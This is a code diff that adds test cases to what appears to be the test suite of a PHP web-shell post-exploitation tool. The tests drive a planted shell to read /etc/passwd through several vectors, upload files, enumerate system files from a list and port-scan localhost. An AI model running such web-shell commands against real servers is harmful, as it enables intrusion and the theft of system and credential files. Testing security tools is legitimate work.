@@ -33,7 +33,14 @@ scripts = {
 
             '/tmp/proxybrokescript' : """:set shell.php proxy='%s'
 :shell.php 'print("OK test");'
-""" % (http_proxy[:-1])
+""" % (http_proxy[:-1]),
+
+            '/tmp/enumlist' : """/etc/motd
+/etc/dasadas
+/lkj/kjhkjlh
+/boot/lkjlsdaassad
+/etc/passwd
+""" 
            
            }
 
@@ -169,9 +176,29 @@ TS = [
         TC([ urlpwd, ':file.read /etc/passwd' ], ':daemon:/usr/sbin:'), 
         TC([ urlpwd, ':file.read rpath=/etc/passwd vector=base64' ], ':daemon:/usr/sbin:'), 
         TC([ urlpwd, ':file.read rpath=/etc/passwd vector=copy' ], ':daemon:/usr/sbin:'), 
-        TC([ urlpwd, ':file.read rpath=/etc/passwd vector=symlink' ], ':daemon:/usr/sbin:')
-        ])
+        TC([ urlpwd, ':file.read rpath=/etc/passwd vector=symlink' ], ':daemon:/usr/sbin:'),
+        TC([ urlpwd, ':file.read rpath=asdasd vector=symlink' ], 'File read failed')
+        ]),
       
+      TG('upload', 'Upload file',
+        [
+        TC([ urlpwd, ':file.upload /etc/motd %s/asd' % writable_dir ], 'File.*uploaded'),
+        TC([ urlpwd, ':file.upload /etc/motd lkjh/lkj' ], 'creation failed'), 
+        TC([ urlpwd, ':file.upload /etc/motd %s/asd' % writable_dir ], 'already exists.*File.*uploaded'),
+        TC([ urlpwd, ':file.upload /etc/mot kjhkjlh' ], 'Open file \'/etc/mot\' failed'),
+        ]),
+      
+      TG('enum', 'Enumerate files',
+        [
+        TC([ urlpwd, ':file.enum /tmp/enumlist' ], '/etc/motd.*/etc/passwd')
+        ]),
+      
+      
+      TG('scan', 'Network scanning',
+        [
+        TC([ urlpwd, ':net.scan localhost 12,30,40,70-90,2555' ], 'OPEN: 127.0.0.1:80'),
+        TC([ urlpwd, ':net.scan localhost 12,30' ], 'OPEN', negate=True)
+        ])
       
       ]       
     
